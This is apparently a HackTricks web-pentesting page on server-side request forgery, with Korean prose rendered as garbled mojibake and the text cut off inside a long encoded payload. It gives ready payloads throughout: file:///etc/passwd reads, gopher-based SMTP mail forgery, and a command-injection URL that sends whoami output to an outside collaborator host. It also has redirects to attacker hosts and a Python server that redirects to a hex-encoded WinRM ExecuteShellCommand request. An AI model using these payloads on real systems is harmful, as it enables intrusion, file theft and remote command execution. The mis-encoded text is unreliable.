# SSRF (ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡°)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰ ì»¤ë®¤ë‹ˆí‹° ë„êµ¬**ë¥¼ í™œìš©í•œ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>


## ê¸°ë³¸ ì •ë³´

**ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡° (SSRF)** ì·¨ì•½ì ì€ ê³µê²©ìê°€ **ì„œë²„ ì¸¡ ì• í”Œë¦¬ì¼€ì´ì…˜**ì„ ì¡°ì‘í•˜ì—¬ ì›í•˜ëŠ” ë„ë©”ì¸ìœ¼ë¡œ **HTTP ìš”ì²­**ì„ ë³´ë‚´ë„ë¡ í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ê³µê²©ìê°€ ì§€ì‹œí•œ ì„ì˜ì˜ ì™¸ë¶€ ìš”ì²­ì„ ì„œë²„ì— ë…¸ì¶œì‹œí‚µë‹ˆë‹¤.

## SSRF ìº¡ì²˜

ë¨¼ì € ì§ì ‘ ìƒì„±í•œ SSRF ìƒí˜¸ì‘ìš©ì„ ìº¡ì²˜í•´ì•¼ í•©ë‹ˆë‹¤. HTTP ë˜ëŠ” DNS ìƒí˜¸ì‘ìš©ì„ ìº¡ì²˜í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **Burp Collaborator**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
* [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - ngrokì„ ì‚¬ìš©í•œ Burp Collaborator

## í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ëœ ë„ë©”ì¸ ìš°íšŒ

ì¼ë°˜ì ìœ¼ë¡œ SSRFê°€ ì‘ë™í•˜ëŠ” ê²ƒì€ **íŠ¹ì • í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ëœ ë„ë©”ì¸** ë˜ëŠ” URLì—ì„œë§Œ ì‘ë™í•˜ëŠ” ê²½ìš°ì…ë‹ˆë‹¤. ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” í•´ë‹¹ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•œ **ê¸°ë²• ëª¨ìŒ**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### ì˜¤í”ˆ ë¦¬ë””ë ‰ì…˜ì„ í†µí•œ ìš°íšŒ

ì„œë²„ê°€ ì˜¬ë°”ë¥´ê²Œ ë³´í˜¸ë˜ì–´ ìˆë‹¤ë©´ ì›¹ í˜ì´ì§€ ë‚´ì—ì„œ **ì˜¤í”ˆ ë¦¬ë””ë ‰ì…˜ì„ ì•…ìš©í•˜ì—¬ ëª¨ë“  ì œí•œì„ ìš°íšŒ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›¹ í˜ì´ì§€ëŠ” **ë™ì¼í•œ ë„ë©”ì¸ìœ¼ë¡œì˜ SSRFë¥¼ í—ˆìš©**í•˜ê³  ì•„ë§ˆë„ **ë¦¬ë””ë ‰ì…˜ì„ ë”°ë¥¼ ê²ƒ**ì´ë¯€ë¡œ **ì˜¤í”ˆ ë¦¬ë””ë ‰ì…˜ì„ ì•…ìš©í•˜ì—¬ ì„œë²„ê°€ ë‚´ë¶€ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤**í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ìì„¸í•œ ë‚´ìš©ì€ ì—¬ê¸°ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## í”„ë¡œí† ì½œ

- **file://**
- `file://` URL schemeì€ `/etc/passwd`ë¥¼ ì§ì ‘ ê°€ë¦¬í‚µë‹ˆë‹¤: `file:///etc/passwd`

- **dict://**
- DICT URL schemeì€ DICT í”„ë¡œí† ì½œì„ í†µí•´ ì •ì˜ë‚˜ ë‹¨ì–´ ëª©ë¡ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì£¼ì–´ì§„ ì˜ˆì œì—ì„œëŠ” íŠ¹ì • ë‹¨ì–´, ë°ì´í„°ë² ì´ìŠ¤ ë° í•­ëª© ë²ˆí˜¸ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” êµ¬ì„±ëœ URLê³¼ PHP ìŠ¤í¬ë¦½íŠ¸ì˜ ì¸ìŠ¤í„´ìŠ¤ê°€ ê³µê²©ìê°€ ì œê³µí•œ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ DICT ì„œë²„ì— ì—°ê²°ë˜ëŠ” ë° ì˜ëª» ì‚¬ìš©ë  ìˆ˜ ìˆëŠ” ê²½ìš°ë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`

- **SFTP://**
- ì•ˆì „í•œ ì…¸ì„ í†µí•œ ì•ˆì „í•œ íŒŒì¼ ì „ì†¡ì„ ìœ„í•œ í”„ë¡œí† ì½œë¡œ ì‹ë³„ë˜ë©°, PHP ìŠ¤í¬ë¦½íŠ¸ê°€ ì•…ì„± SFTP ì„œë²„ì— ì—°ê²°ë˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆì œê°€ ì œê³µë©ë‹ˆë‹¤: `url=sftp://generic.com:11111/`

- **TFTP://**
- UDPë¥¼ í†µí•´ ì‘ë™í•˜ëŠ” Trivial File Transfer Protocolì€ PHP ìŠ¤í¬ë¦½íŠ¸ê°€ TFTP ì„œë²„ì— ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ì„¤ê³„ëœ ì˜ˆì œì™€ í•¨ê»˜ ì–¸ê¸‰ë©ë‹ˆë‹¤. 'generic.com'ì˜ '12346' í¬íŠ¸ë¡œ 'TESTUDPPACKET' íŒŒì¼ì— ëŒ€í•œ TFTP ìš”ì²­ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`

- **LDAP://**
- ì´ ì„¸ê·¸ë¨¼íŠ¸ì—ì„œëŠ” ê²½ëŸ‰ ë””ë ‰í„°ë¦¬ ì•¡ì„¸ìŠ¤ í”„ë¡œí† ì½œì¸ LDAPì„ ë‹¤ë£¨ë©°, IP ë„¤íŠ¸ì›Œí¬ ìƒì—ì„œ ë¶„ì‚° ë””ë ‰í„°ë¦¬ ì •ë³´ ì„œë¹„ìŠ¤ë¥¼ ê´€ë¦¬í•˜ê³  ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë¨ì„ ê°•ì¡°í•©ë‹ˆë‹¤. ë¡œì»¬í˜¸ìŠ¤íŠ¸ì˜ LDAP ì„œë²„ì™€ ìƒí˜¸ì‘ìš©: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`

- **SMTP**
- SSRF ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ë¡œì»¬í˜¸ìŠ¤íŠ¸ì˜ SMTP ì„œë¹„ìŠ¤ì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ë°©ë²•ì´ ì„¤ëª…ë˜ë©°, ë‚´ë¶€ ë„ë©”ì¸ ì´ë¦„ì„ ê³µê°œí•˜ê³  í•´ë‹¹ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì¶”ê°€ ì¡°ì‚¬ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë‹¨ê³„ê°€ ì œì‹œë©ë‹ˆë‹¤.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF ìš°íšŒ**
- ë§Œì•½ SSRFê°€ **curl**ì— ì˜í•´ ì‹¤í–‰ëœë‹¤ë©´, curlì€ [**URL globbing**](https://everything.curl.dev/cmdline/globbing)ì´ë¼ëŠ” ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆëŠ”ë°, ì´ëŠ” WAF ìš°íšŒì— ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì´ [**ê¸°ì‚¬**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi)ì—ì„œëŠ” **`file` í”„ë¡œí† ì½œì„ í†µí•œ ê²½ë¡œ ìˆœíšŒ**ë¥¼ ìœ„í•œ ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher í”„ë¡œí† ì½œì€ ì„œë²„ í†µì‹ ì„ ìœ„í•´ IP, í¬íŠ¸ ë° ë°”ì´íŠ¸ë¥¼ ì§€ì •í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì— ëŒ€í•´ ì„¤ëª…í•˜ë©°, Gopherusì™€ remote-method-guesserì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•˜ëŠ” ë°©ë²•ì„ ë‹¤ë£¹ë‹ˆë‹¤. ë‘ ê°€ì§€ ë‹¤ë¥¸ ì‚¬ìš© ì‚¬ë¡€ê°€ ì„¤ëª…ë©ë‹ˆë‹¤:

### Gopher://

ì´ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ë©´ ì„œë²„ê°€ ë³´ë‚¼ **IP, í¬íŠ¸ ë° ë°”ì´íŠ¸**ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ê¸°ë³¸ì ìœ¼ë¡œ SSRFë¥¼ ì•…ìš©í•˜ì—¬ **ëª¨ë“  TCP ì„œë²„ì™€ í†µì‹ **í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë‹¨, ë¨¼ì € í•´ë‹¹ ì„œë¹„ìŠ¤ì™€ í†µì‹ í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤).\
ë‹¤í–‰íˆë„, [Gopherus](https://github.com/tarunkant/Gopherus)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ì„œë¹„ìŠ¤ì— ëŒ€í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)ë¥¼ ì‚¬ìš©í•˜ì—¬ _Java RMI_ ì„œë¹„ìŠ¤ì— ëŒ€í•œ _gopher_ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**

Gopher HTTP is a technique used in Server-Side Request Forgery (SSRF) attacks. SSRF is a vulnerability that allows an attacker to make requests from the server to other internal or external resources. Gopher HTTP takes advantage of the Gopher protocol, which is a simple protocol used for retrieving documents over the Internet.

To perform a Gopher HTTP attack, the attacker crafts a URL that starts with the "gopher://" scheme instead of the usual "http://" or "https://". The URL is then followed by the IP address or domain name of the target server and the port number. After that, the attacker can specify the desired action, such as requesting a file or executing a command.

The Gopher protocol allows the attacker to bypass certain security measures, as it is not as widely monitored or filtered as HTTP or HTTPS. This makes it an attractive option for attackers looking to exploit SSRF vulnerabilities.

To protect against Gopher HTTP attacks, it is important to validate and sanitize user input, especially when making requests to external resources. Additionally, network filtering and monitoring can help detect and block suspicious Gopher requests.

Remember, understanding and being aware of different attack techniques like Gopher HTTP can help you better defend against them.
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP - 1337ì— ëŒ€í•œ ë°± ì»¤ë„¥ì…˜**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}


## Referrer í—¤ë”ë¥¼ í†µí•œ SSRF ë° ê¸°íƒ€ ë°©ë²•

ì„œë²„ì˜ ë¶„ì„ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ì¢…ì¢… Referrer í—¤ë”ë¥¼ ê¸°ë¡í•˜ì—¬ ë“¤ì–´ì˜¤ëŠ” ë§í¬ë¥¼ ì¶”ì í•˜ëŠ”ë°, ì´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ Server-Side Request Forgery (SSRF) ì·¨ì•½ì ì— ë…¸ì¶œì‹œí‚¤ëŠ” ì‹¤ìˆ˜ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤. ì´ëŠ” ë¶„ì„ ë„êµ¬ê°€ Referrer í—¤ë”ì— ì–¸ê¸‰ëœ ì™¸ë¶€ URLì„ ë°©ë¬¸í•˜ì—¬ ì°¸ì¡° ì‚¬ì´íŠ¸ ì½˜í…ì¸ ë¥¼ ë¶„ì„í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ë°œê²¬í•˜ê¸° ìœ„í•´ Burp Suite í”ŒëŸ¬ê·¸ì¸ "**Collaborator Everywhere**"ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìœ¼ë©°, ì´ëŠ” ë¶„ì„ ë„êµ¬ê°€ Referer í—¤ë”ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë°©ì‹ì„ í™œìš©í•˜ì—¬ ì ì¬ì ì¸ SSRF ê³µê²© í‘œë©´ì„ ì‹ë³„í•©ë‹ˆë‹¤.

## ì¸ì¦ì„œì˜ SNI ë°ì´í„°ë¥¼ í†µí•œ SSRF

ê°„ë‹¨í•œ ì„¤ì •ì„ í†µí•´ ì–´ë–¤ ë°±ì—”ë“œì—ë„ ì—°ê²°í•  ìˆ˜ ìˆëŠ” ì˜ëª»ëœ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ì€ Nginx êµ¬ì„± ì˜ˆì œë¡œ ì„¤ëª…ë©ë‹ˆë‹¤:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
ì´ êµ¬ì„±ì—ì„œëŠ” ì„œë²„ ì´ë¦„ í‘œì‹œ (SNI) í•„ë“œì˜ ê°’ì´ ë°±ì—”ë“œ ì£¼ì†Œë¡œ ì§ì ‘ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ì„¤ì •ì€ ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡° (SSRF) ì·¨ì•½ì ì„ ë…¸ì¶œì‹œí‚¤ë©°, SNI í•„ë“œì— ì›í•˜ëŠ” IP ì£¼ì†Œë‚˜ ë„ë©”ì¸ ì´ë¦„ì„ ì§€ì •í•¨ìœ¼ë¡œì¨ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `openssl` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ `internal.host.com`ê³¼ ê°™ì€ ì„ì˜ì˜ ë°±ì—”ë“œì— ì—°ê²°ì„ ê°•ì œí•˜ëŠ” ì•…ìš© ì˜ˆì œëŠ” ì•„ë˜ì— ì œì‹œë˜ì—ˆìŠµë‹ˆë‹¤:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget íŒŒì¼ ì—…ë¡œë“œ](../file-upload/#wget-file-upload-ssrf-trick)

## ëª…ë ¹ ì£¼ì…ì„ í†µí•œ SSRF

ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ì‹œë„í•´ ë³¼ ê°€ì¹˜ê°€ ìˆìŠµë‹ˆë‹¤: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF ë Œë”ë§

ì›¹ í˜ì´ì§€ê°€ ì œê³µí•œ ì •ë³´ë¡œ PDFë¥¼ ìë™ìœ¼ë¡œ ìƒì„±í•˜ëŠ” ê²½ìš°, PDF ìƒì„±ì(ì„œë²„) ìì²´ì—ì„œ ì‹¤í–‰ë˜ëŠ” JSë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ SSRFë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [**ì—¬ê¸°ì—ì„œ ìì„¸í•œ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRFì—ì„œ DoSë¡œ

ì—¬ëŸ¬ ì„¸ì…˜ì„ ìƒì„±í•˜ê³  ì„¸ì…˜ì—ì„œ SSRFë¥¼ ì´ìš©í•˜ì—¬ ë¬´ê±°ìš´ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•˜ì„¸ìš”.

## SSRF PHP í•¨ìˆ˜

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## Gopherë¡œì˜ SSRF ë¦¬ë””ë ‰ì…˜

ì¼ë¶€ ê³µê²©ì—ì„œëŠ” **ë¦¬ë””ë ‰ì…˜ ì‘ë‹µì„ ë³´ë‚´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤** (ì•„ë§ˆë„ gopherì™€ ê°™ì€ ë‹¤ë¥¸ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´). ì—¬ê¸°ì—ëŠ” ë¦¬ë””ë ‰ì…˜ìœ¼ë¡œ ì‘ë‹µí•˜ëŠ” ë‹¤ì–‘í•œ íŒŒì´ì¬ ì½”ë“œê°€ ìˆìŠµë‹ˆë‹¤:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)

self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%